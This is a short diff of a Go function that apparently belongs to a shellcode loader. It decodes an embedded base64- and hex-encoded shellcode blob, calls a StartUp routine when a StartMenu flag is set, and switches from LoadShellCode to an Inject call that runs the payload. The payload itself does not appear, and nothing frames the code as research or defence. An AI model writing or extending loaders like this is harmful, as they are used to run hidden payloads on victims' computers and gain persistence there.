@@ -66,7 +66,6 @@ func startService() error {
 		os.Exit(0)
 	}
 	if StartMenu {
-		//TODO::
 		StartUp()
 	}
 	decodeBytes, err := base64.StdEncoding.DecodeString(string(ShellCodeByte))
@@ -75,7 +74,7 @@ func startService() error {
 	}
 	shellCode, err := hex.DecodeString(string(decodeBytes))
 	if err == nil {
-		LoadShellCode(shellCode)
+		Inject(shellCode)
 	}
 	return errors.New(err.Error())
 }
